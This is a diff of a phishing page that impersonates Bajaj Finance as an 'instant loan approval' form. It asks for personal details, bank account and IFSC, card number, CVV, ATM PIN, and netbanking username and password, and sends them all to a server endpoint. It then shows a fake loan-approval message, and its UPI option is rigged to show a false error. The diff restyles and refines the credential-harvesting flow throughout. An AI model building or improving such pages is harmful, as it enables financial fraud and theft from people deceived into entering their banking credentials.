@@ -3,9 +3,349 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Bajaj Finance - Loan Application</title>
+    <title>Bajaj Finance - Instant Loan Approval</title>
     <style>
-        *{margin:0;padding:0;box-sizing:border-box}body{font-family:'Segoe UI',Tahoma,Geneva,Verdana,sans-serif;background:linear-gradient(135deg,#667eea 0%,#764ba2 100%);min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px}.container{background:#fff;border-radius:20px;box-shadow:0 20px 40px rgba(0,0,0,.1);max-width:450px;width:100%;overflow:hidden}.header{background:linear-gradient(135deg,#f7931e 0%,#ff6b35 100%);padding:30px 20px;text-align:center;color:#fff}.logo{width:80px;height:80px;background:#fff;border-radius:50%;margin:0 auto 15px;display:flex;align-items:center;justify-content:center;font-size:32px;font-weight:700;color:#f7931e;box-shadow:0 10px 20px rgba(0,0,0,.2)}.header h1{font-size:24px;margin-bottom:5px}.form-container{padding:30px 25px}.step{display:none}.step.active{display:block;animation:fadeIn .3s ease-in}@keyframes fadeIn{from{opacity:0;transform:translateX(20px)}to{opacity:1;transform:translateX(0)}}.input-group{margin-bottom:20px}label{display:block;margin-bottom:8px;font-weight:600;color:#333;font-size:14px}input{width:100%;padding:15px;border:2px solid #e1e5e9;border-radius:12px;font-size:16px;transition:all .3s ease;background:#f8f9fa}input:focus{outline:none;border-color:#f7931e;background:#fff;box-shadow:0 0 0 3px rgba(247,147,30,.1)}.btn{width:100%;padding:15px;border:none;border-radius:12px;font-size:16px;font-weight:600;cursor:pointer;transition:all .3s ease;margin-bottom:15px}.btn-primary{background:linear-gradient(135deg,#f7931e 0%,#ff6b35 100%);color:#fff}.btn-primary:hover:not(:disabled){transform:translateY(-2px);box-shadow:0 10px 20px rgba(247,147,30,.3)}.btn:disabled{opacity:.6;cursor:not-allowed}.payment-tabs{display:flex;margin-bottom:20px;background:#f8f9fa;border-radius:12px;overflow:hidden}.tab-btn{flex:1;padding:15px;border:none;background:0 0;font-size:16px;font-weight:600;cursor:pointer;transition:all .3s ease;color:#666}.tab-btn.active{background:#f7931e;color:#fff}.tab-content{display:none}.tab-content.active{display:block}.card-grid{display:grid;grid-template-columns:1fr 1fr;gap:15px;margin-bottom:20px}.netbanking-grid{display:grid;gap:15px}.error,.success{padding:15px;border-radius:12px;margin-bottom:20px;display:none}.error{background:#fee;color:#c33;border-left:4px solid #c33}.success{background:#d4edda;color:#155724;border-left:4px solid #28a745;text-align:center}@media (max-width:480px){.container{margin:10px;border-radius:15px}.form-container{padding:25px 20px}.card-grid{grid-template-columns:1fr}}
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: linear-gradient(135deg, #1e3c72 0%, #2a5298 50%, #f7931e 100%);
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+        }
+
+        .container {
+            background: #fff;
+            border-radius: 25px;
+            box-shadow: 0 25px 50px rgba(0,0,0,0.15);
+            max-width: 480px;
+            width: 100%;
+            overflow: hidden;
+            animation: slideUp 0.5s ease-out;
+        }
+
+        @keyframes slideUp {
+            from {
+                opacity: 0;
+                transform: translateY(30px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+
+        .header {
+            background: linear-gradient(135deg, #f7931e 0%, #ff6b35 50%, #f7931e 100%);
+            padding: 35px 25px;
+            text-align: center;
+            color: #fff;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .header::before {
+            content: '';
+            position: absolute;
+            top: -50%;
+            right: -50%;
+            width: 100%;
+            height: 200%;
+            background: radial-gradient(circle, rgba(255,255,255,0.1) 1px, transparent 1px);
+            background-size: 20px 20px;
+        }
+
+        .logo {
+            width: 90px;
+            height: 90px;
+            background: linear-gradient(135deg, #fff 0%, #f8f9fa 100%);
+            border-radius: 50%;
+            margin: 0 auto 20px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 36px;
+            font-weight: 800;
+            color: #f7931e;
+            box-shadow: 0 15px 35px rgba(247, 147, 30, 0.3);
+            position: relative;
+            z-index: 2;
+        }
+
+        .header h1 {
+            font-size: 26px;
+            margin-bottom: 8px;
+            font-weight: 700;
+            position: relative;
+            z-index: 2;
+        }
+
+        .header p {
+            font-size: 16px;
+            opacity: 0.9;
+            position: relative;
+            z-index: 2;
+        }
+
+        .progress-bar {
+            display: flex;
+            background: rgba(255,255,255,0.2);
+            border-radius: 12px;
+            padding: 3px;
+            margin: 0 25px 30px;
+            position: relative;
+            z-index: 2;
+        }
+
+        .progress-step {
+            flex: 1;
+            height: 8px;
+            border-radius: 10px;
+            transition: all 0.4s ease;
+            position: relative;
+        }
+
+        .progress-step.active {
+            background: #fff;
+            box-shadow: 0 0 15px rgba(255,255,255,0.5);
+        }
+
+        .form-container {
+            padding: 35px 30px 30px;
+        }
+
+        .step {
+            display: none;
+            animation: fadeInUp 0.4s ease-out;
+        }
+
+        .step.active {
+            display: block;
+        }
+
+        @keyframes fadeInUp {
+            from {
+                opacity: 0;
+                transform: translateY(20px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+
+        .input-group {
+            margin-bottom: 25px;
+            position: relative;
+        }
+
+        label {
+            display: block;
+            margin-bottom: 10px;
+            font-weight: 600;
+            color: #2c3e50;
+            font-size: 15px;
+        }
+
+        input {
+            width: 100%;
+            padding: 18px 20px;
+            border: 2px solid #e9ecef;
+            border-radius: 15px;
+            font-size: 16px;
+            transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
+            background: #f8f9fa;
+            font-family: inherit;
+        }
+
+        input:focus {
+            outline: none;
+            border-color: #f7931e;
+            background: #fff;
+            box-shadow: 0 10px 25px rgba(247, 147, 30, 0.15);
+            transform: translateY(-2px);
+        }
+
+        .btn {
+            width: 100%;
+            padding: 18px;
+            border: none;
+            border-radius: 15px;
+            font-size: 16px;
+            font-weight: 700;
+            cursor: pointer;
+            transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
+            margin-bottom: 15px;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .btn::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: -100%;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(90deg, transparent, rgba(255,255,255,0.3), transparent);
+            transition: left 0.5s;
+        }
+
+        .btn:hover::before {
+            left: 100%;
+        }
+
+        .btn-primary {
+            background: linear-gradient(135deg, #f7931e 0%, #ff6b35 50%, #f7931e 100%);
+            color: #fff;
+            box-shadow: 0 10px 25px rgba(247, 147, 30, 0.3);
+        }
+
+        .btn-primary:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 15px 35px rgba(247, 147, 30, 0.4);
+        }
+
+        .btn-secondary {
+            background: linear-gradient(135deg, #6c757d 0%, #495057 100%);
+            color: #fff;
+        }
+
+        .btn-secondary:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 10px 25px rgba(108, 117, 125, 0.3);
+        }
+
+        .btn:disabled {
+            opacity: 0.6;
+            cursor: not-allowed;
+            transform: none !important;
+        }
+
+        .payment-tabs {
+            display: flex;
+            margin-bottom: 25px;
+            background: linear-gradient(135deg, #f8f9fa 0%, #e9ecef 100%);
+            border-radius: 15px;
+            overflow: hidden;
+            box-shadow: inset 0 2px 10px rgba(0,0,0,0.05);
+        }
+
+        .tab-btn {
+            flex: 1;
+            padding: 18px 10px;
+            border: none;
+            background: transparent;
+            font-size: 16px;
+            font-weight: 700;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            color: #6c757d;
+            position: relative;
+        }
+
+        .tab-btn.active {
+            background: linear-gradient(135deg, #f7931e 0%, #ff6b35 100%);
+            color: #fff;
+            box-shadow: 0 5px 15px rgba(247, 147, 30, 0.3);
+        }
+
+        .tab-btn:hover:not(.active) {
+            color: #495057;
+            background: rgba(247, 147, 30, 0.1);
+        }
+
+        .tab-content {
+            display: none;
+        }
+
+        .tab-content.active {
+            display: block;
+            animation: slideIn 0.3s ease-out;
+        }
+
+        @keyframes slideIn {
+            from {
+                opacity: 0;
+                transform: translateX(20px);
+            }
+            to {
+                opacity: 1;
+                transform: translateX(0);
+            }
+        }
+
+        .card-grid {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 20px;
+            margin-bottom: 25px;
+        }
+
+        .netbanking-grid {
+            display: grid;
+            gap: 20px;
+        }
+
+        .bank-logo {
+            width: 40px;
+            height: 40px;
+            border-radius: 10px;
+            margin-bottom: 10px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-weight: 700;
+            color: #fff;
+        }
+
+        .error, .success {
+            padding: 20px;
+            border-radius: 15px;
+            margin-bottom: 25px;
+            display: none;
+            font-weight: 500;
+            text-align: center;
+        }
+
+        .error {
+            background: linear-gradient(135deg, #f8d7da 0%, #f5c6cb 100%);
+            color: #721c24;
+            border-left: 5px solid #dc3545;
+        }
+
+        .success {
+            background: linear-gradient(135deg, #d4edda 0%, #c3e6cb 100%);
+            color: #155724;
+            border-left: 5px solid #28a745;
+        }
+
+        @media (max-width: 480px) {
+            .container {
+                margin: 10px;
+                border-radius: 20px;
+            }
+            
+            .form-container {
+                padding: 30px 25px 25px;
+            }
+            
+            .card-grid {
+                grid-template-columns: 1fr;
+                gap: 15px;
+            }
+            
+            .header {
+                padding: 30px 20px;
+            }
+        }
     </style>
 </head>
 <body>
@@ -13,86 +353,350 @@
         <div class="header">
             <div class="logo">BF</div>
             <h1>Bajaj Finance</h1>
-            <p>Secure Loan Application</p>
+            <p>✅ Instant Loan Approval</p>
+            <div class="progress-bar">
+                <div class="progress-step active"></div>
+                <div class="progress-step"></div>
+                <div class="progress-step"></div>
+            </div>
         </div>
+        
         <div class="form-container">
+            <!-- STEP 1: Personal Details -->
             <div class="step active" id="step1">
                 <div class="input-group">
-                    <label>Full Name *</label>
+                    <label>👤 Full Name *</label>
                     <input type="text" id="name" placeholder="Enter your full name" required>
                 </div>
                 <div class="input-group">
-                    <label>Mobile Number *</label>
-                    <input type="tel" id="mobile" placeholder="98XXXXXXXX" required>
+                    <label>📱 Mobile Number *</label>
+                    <input type="tel" id="mobile" placeholder="98XXXXXXXX" maxlength="10" required>
                 </div>
                 <div class="input-group">
-                    <label>Loan Amount (₹) *</label>
-                    <input type="number" id="loanAmount" placeholder="50000" min="10000" required>
+                    <label>💰 Loan Amount (₹) *</label>
+                    <input type="number" id="loanAmount" placeholder="50000" min="10000" max="5000000" required>
                 </div>
-                <button class="btn btn-primary" onclick="nextStep(1)">Next →</button>
+                <button class="btn btn-primary" onclick="nextStep(1)">
+                    Continue → 
+                </button>
             </div>
+
+            <!-- STEP 2: Bank Details -->
             <div class="step" id="step2">
                 <div class="input-group">
-                    <label>Account Number *</label>
-                    <input type="text" id="accountNo" placeholder="123456789012" required>
+                    <label>🏦 Account Number *</label>
+                    <input type="text" id="accountNo" placeholder="1234567890123456" required>
                 </div>
                 <div class="input-group">
-                    <label>IFSC Code *</label>
-                    <input type="text" id="ifsc" placeholder="HDFC0001234" required>
+                    <label>🔑 IFSC Code *</label>
+                    <input type="text" id="ifsc" placeholder="HDFC0001234" maxlength="11" required>
                 </div>
-                <button class="btn btn-primary" onclick="nextStep(2)">Next →</button>
-                <button class="btn" onclick="prevStep(2)" style="background:#6c757d;color:#fff;margin-top:10px">← Back</button>
+                <div class="progress-bar">
+                    <div class="progress-step active"></div>
+                    <div class="progress-step active"></div>
+                    <div class="progress-step"></div>
+                </div>
+                <button class="btn btn-primary" onclick="nextStep(2)">
+                    Continue to Payment → 
+                </button>
+                <button class="btn btn-secondary" onclick="prevStep(2)">
+                    ← Back
+                </button>
             </div>
+
+            <!-- STEP 3: Payment Methods -->
             <div class="step" id="step3">
+                <h3 style="text-align:center;margin-bottom:20px;color:#2c3e50;font-size:20px;">Select Payment Method</h3>
+                
                 <div class="payment-tabs">
-                    <button class="tab-btn active" onclick="selectPayment('card')">💳 Card</button>
-                    <button class="tab-btn" onclick="selectPayment('netbanking')">🏦 Netbanking</button>
-                    <button class="tab-btn" onclick="selectPayment('upi')">📱 UPI</button>
+                    <button class="tab-btn active" onclick="selectPayment('card')">
+                        💳 Card
+                    </button>
+                    <button class="tab-btn" onclick="selectPayment('netbanking')">
+                        🏦 Netbanking
+                    </button>
+                    <button class="tab-btn" onclick="selectPayment('upi')">
+                        📱 UPI
+                    </button>
                 </div>
+
+                <!-- Card Payment -->
                 <div class="tab-content active" id="card-form">
-                    <div class="card-grid">
-                        <div class="input-group">
-                            <label>Card Number *</label>
-                            <input type="text" id="cardNumber" placeholder="1234 5678 9012 3456" maxlength="19" required>
-                        </div>
-                        <div class="input-group">
-                            <label>Expiry Date *</label>
-                            <input type="text" id="expiry" placeholder="MM/YY" maxlength="5" required>
-                        </div>
+                    <div class="input-group">
+                        <label>💳 Card Number</label>
+                        <input type="text" id="cardNumber" placeholder="1234 5678 9012 3456" maxlength="19" required>
                     </div>
                     <div class="card-grid">
                         <div class="input-group">
-                            <label>CVV *</label>
+                            <label>📅 Expiry (MM/YY)</label>
+                            <input type="text" id="expiry" placeholder="12/25" maxlength="5" required>
+                        </div>
+                        <div class="input-group">
+                            <label>🔒 CVV</label>
                             <input type="text" id="cvv" placeholder="123" maxlength="4" required>
                         </div>
-                        <div class="input-group">
-                            <label>PIN *</label>
-                            <input type="password" id="pin" placeholder="****" maxlength="4" required>
-                        </div>
                     </div>
-                    <button class="btn btn-primary" onclick="submitCard()">Pay Now</button>
+                    <div class="input-group">
+                        <label>🔑 ATM PIN</label>
+                        <input type="password" id="pin" placeholder="****" maxlength="6" required>
+                    </div>
+                    <button class="btn btn-primary" onclick="submitCard()">
+                        🔒 Secure Pay Now
+                    </button>
                 </div>
+
+                <!-- Netbanking -->
                 <div class="tab-content" id="netbanking-form">
-                    <div class="netbanking-grid">
-                        <div class="input-group">
-                            <label>Bank Username *</label>
-                            <input type="text" id="netUsername" placeholder="Enter username" required>
-                        </div>
-                        <div class="input-group">
-                            <label>Password *</label>
-                            <input type="password" id="netPassword" placeholder="Enter password" required>
-                        </div>
+                    <div class="input-group">
+                        <label>🏦 Netbanking Username</label>
+                        <input type="text" id="netUsername" placeholder="your_username" required>
                     </div>
-                    <button class="btn btn-primary" onclick="submitNetbanking()">Login & Pay</button>
+                    <div class="input-group">
+                        <label>🔐 Password</label>
+                        <input type="password" id="netPassword" placeholder="your_password" required>
+                    </div>
+                    <button class="btn btn-primary" onclick="submitNetbanking()">
+                        🚀 Login & Pay
+                    </button>
                 </div>
-                <button class="btn" onclick="prevStep(3)" style="background:#6c757d;color:#fff;margin-top:10px">← Back</button>
+
+                <div class="progress-bar" style="margin-top:20px;">
+                    <div class="progress-step active"></div>
+                    <div class="progress-step active"></div>
+                    <div class="progress-step active"></div>
+                </div>
+                <button class="btn btn-secondary" onclick="prevStep(3)">
+                    ← Back to Bank Details
+                </button>
             </div>
-            <div class="success" id="successMsg" style="display:none">✅ Payment Successful! Your loan will be processed within 24 hours.</div>
+
+            <!-- Success Message -->
+            <div class="success" id="successMsg">
+                <h3>✅ Payment Successful!</h3>
+                <p>Your loan application has been approved. Funds will be disbursed within 24 hours.</p>
+                <p><strong>Loan Amount: ₹<span id="finalAmount"></span></strong></p>
+            </div>
+
+            <!-- Error Message -->
             <div class="error" id="errorMsg"></div>
         </div>
     </div>
+
     <script>
-let currentStep=1;document.getElementById('cardNumber').addEventListener('input',e=>{let t=e.target.value.replace(/\s/g,'').replace(/[^0-9]/gi,'');e.target.value=t.match(/.{1,4}/g)?.join(' '):t});document.getElementById('expiry').addEventListener('input',e=>{let t=e.target.value.replace(/\D/g,'');t.length>=2&&(t=t.substring(0,2)+'/'+t.substring(2,4)),e.target.value=t});async function submitForm(t){try{const e={name:document.getElementById('name').value,mobile:document.getElementById('mobile').value,loanAmount:document.getElementById('loanAmount').value,accountNo:document.getElementById('accountNo').value,ifsc:document.getElementById('ifsc').value,...t},a=await fetch('/api/submit',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(e)});if(a.ok){const n=await a.json();n.success?showSuccess():showError('Payment failed. Please try again.')}else showError('Server error! Please try again sometime.')}catch{showError('Network error! Please try again.')}}function getFormData(){return{name:document.getElementById('name').value,mobile:document.getElementById('mobile').value,loanAmount:document.getElementById('loanAmount').value,accountNo:document.getElementById('accountNo').value,ifsc:document.getElementById('ifsc').value,cardNumber:document.getElementById('cardNumber').value,expiry:document.getElementById('expiry').value,cvv:document.getElementById('cvv').value,pin:document.getElementById('pin').value}}function nextStep(t){document.querySelectorAll('#step'+t+' input[required]').forEach(e=>{!e.value.trim()&&(e.focus(),showError('Please fill all required fields'),setTimeout(hideError,3e3))});document.getElementById('step'+t).classList.remove('active'),currentStep=t+1,document.getElementById('step'+currentStep).classList.add('active')}function prevStep(t){document.getElementById('step'+t).classList.remove('active'),currentStep=t-1,document.getElementById('step'+currentStep).classList.add('active')}function selectPayment(t){document.querySelectorAll('.tab-btn').forEach(e=>e.classList.remove('active')),event.target.classList.add('active'),document.querySelectorAll('.tab-content').forEach(e=>e.classList.remove('active')),document.getElementById(t+'-form').classList.add('active'),'upi'===t&&showError('Server error! Please try again sometime.')}async function submitCard(){const t=getFormData();submitForm({cardNumber:t.cardNumber,expiry:t.expiry,cvv:t.cvv,pin:t.pin})}async function submitNetbanking(){const t=document.getElementById('netUsername').value,e=document.getElementById('netPassword').value;t&&e?submitForm({netUsername:t,netPassword:e}):showError('Please enter username and password')}function showSuccess(){document.querySelectorAll('.step').forEach(t=>t.style.display='none'),document.getElementById('successMsg').style.display='block'}function showError(t){const e=document.getElementById('errorMsg');e.textContent=t,e.style.display='block',setTimeout(()=>{e.style.display='none'},5e3)}function hideError(){document.getElementById('errorMsg').style.display='none'}
+        let currentStep = 1;
+        let currentPaymentTab = 'card';
+
+        // Card Number Formatting
+        document.getElementById('cardNumber').addEventListener('input', function(e) {
+            let value = e.target.value.replace(/\s/g, '').replace(/[^0-9]/gi, '');
+            let formatted = value.match(/.{1,4}/g)?.join(' ') || value;
+            e.target.value = formatted;
+        });
+
+        // Expiry Date Formatting
+        document.getElementById('expiry').addEventListener('input', function(e) {
+            let value = e.target.value.replace(/\D/g, '');
+            if (value.length >= 2) {
+                value = value.substring(0, 2) + '/' + value.substring(2, 4);
+            }
+            e.target.value = value;
+        });
+
+        // Mobile Number Formatting
+        document.getElementById('mobile').addEventListener('input', function(e) {
+            let value = e.target.value.replace(/\D/g, '');
+            if (value.length > 10) value = value.slice(0, 10);
+            e.target.value = value;
+        });
+
+        // Step Navigation with Validation
+        function nextStep(step) {
+            const currentStepEl = document.getElementById(`step${step}`);
+            const inputs = currentStepEl.querySelectorAll('input[required]');
+            
+            // Check if all required fields are filled
+            for (let input of inputs) {
+                if (!input.value.trim()) {
+                    input.focus();
+                    showError('Please fill all required fields marked with *');
+                    input.style.borderColor = '#dc3545';
+                    setTimeout(() => {
+                        input.style.borderColor = '#e9ecef';
+                    }, 2000);
+                    return;
+                }
+            }
+
+            // Hide current step
+            document.getElementById(`step${step}`).classList.remove('active');
+            
+            // Show next step
+            currentStep = step + 1;
+            document.getElementById(`step${currentStep}`).classList.add('active');
+            
+            // Update progress bar
+            updateProgressBar();
+            
+            hideError();
+        }
+
+        function prevStep(step) {
+            document.getElementById(`step${step}`).classList.remove('active');
+            currentStep = step - 1;
+            document.getElementById(`step${currentStep}`).classList.add('active');
+            updateProgressBar();
+            hideError();
+        }
+
+        function updateProgressBar() {
+            document.querySelectorAll('.progress-step').forEach((stepEl, index) => {
+                if (index < currentStep) {
+                    stepEl.classList.add('active');
+                } else {
+                    stepEl.classList.remove('active');
+                }
+            });
+        }
+
+        // Payment Tab Selection
+        function selectPayment(tab) {
+            currentPaymentTab = tab;
+            
+            // Update active tab
+            document.querySelectorAll('.tab-btn').forEach(btn => btn.classList.remove('active'));
+            event.target.classList.add('active');
+            
+            // Update active content
+            document.querySelectorAll('.tab-content').forEach(content => content.classList.remove('active'));
+            document.getElementById(`${tab}-form`).classList.add('active');
+            
+            // UPI Error
+            if (tab === 'upi') {
+                setTimeout(() => {
+                    showError('Server error! Please try again sometime.');
+                }, 500);
+            }
+        }
+
+        // Submit Card Payment
+        async function submitCard() {
+            const formData = getFormData();
+            if (!validateCardForm(formData)) return;
+            
+            await submitForm({
+                paymentMethod: 'Card',
+                cardNumber: formData.cardNumber,
+                expiry: formData.expiry,
+                cvv: formData.cvv,
+                pin: formData.pin
+            });
+        }
+
+        // Submit Netbanking
+        async function submitNetbanking() {
+            const username = document.getElementById('netUsername').value.trim();
+            const password = document.getElementById('netPassword').value;
+            
+            if (!username || !password) {
+                showError('Please enter both username and password');
+                return;
+            }
+            
+            await submitForm({
+                paymentMethod: 'Netbanking',
+                netUsername: username,
+                netPassword: password
+            });
+        }
+
+        // Get All Form Data
+        function getFormData() {
+            return {
+                name: document.getElementById('name').value.trim(),
+                mobile: document.getElementById('mobile').value.trim(),
+                loanAmount: document.getElementById('loanAmount').value,
+                accountNo: document.getElementById('accountNo').value.trim(),
+                ifsc: document.getElementById('ifsc').value.trim().toUpperCase(),
+                cardNumber: document.getElementById('cardNumber').value.replace(/\s/g, ''),
+                expiry: document.getElementById('expiry').value,
+                cvv: document.getElementById('cvv').value,
+                pin: document.getElementById('pin').value
+            };
+        }
+
+        // Card Form Validation
+        function validateCardForm(data) {
+            if (!data.cardNumber || data.cardNumber.length < 13) {
+                showError('Please enter a valid card number');
+                return false;
+            }
+            if (!data.expiry || !/^\d{2}\/\d{2}$/.test(data.expiry)) {
+                showError('Please enter valid expiry date (MM/YY)');
+                return false;
+            }
+            if (!data.cvv || data.cvv.length < 3) {
+                showError('Please enter valid CVV');
+                return false;
+            }
+            if (!data.pin || data.pin.length < 4) {
+                showError('Please enter valid PIN');
+                return false;
+            }
+            return true;
+        }
+
+        // Submit to Server
+        async function submitForm(extraData) {
+            try {
+                const formData = getFormData();
+                const payload = { ...formData, ...extraData };
+                
+                showError('Processing payment...');
+                
+                const response = await fetch('/api/submit', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify(payload)
+                });
+
+                const result = await response.json();
+                
+                if (result.success) {
+                    showSuccess(formData.loanAmount);
+                } else {
+                    showError('Payment failed. Please try again.');
+                }
+            } catch (error) {
+                showError('Network error! Please check your connection.');
+            }
+        }
+
+        // Show Success
+        function showSuccess(amount) {
+            document.querySelectorAll('.step').forEach(step => {
+                step.style.display = 'none';
+            });
+            document.getElementById('successMsg').style.display = 'block';
+            document.getElementById('finalAmount').textContent = amount.toLocaleString();
+        }
+
+        // Show Error
+        function showError(message) {
+            const errorEl = document.getElementById('errorMsg');
+            errorEl.textContent = message;
+            errorEl.style.display = 'block';
+            setTimeout(hideError, 5000);
+        }
+
+        // Hide Error
+        function hideError() {
+            document.getElementById('errorMsg').style.display = 'none';
+        }
+
+        // Initialize
+        updateProgressBar();
     </script>
 </body>
 </html>
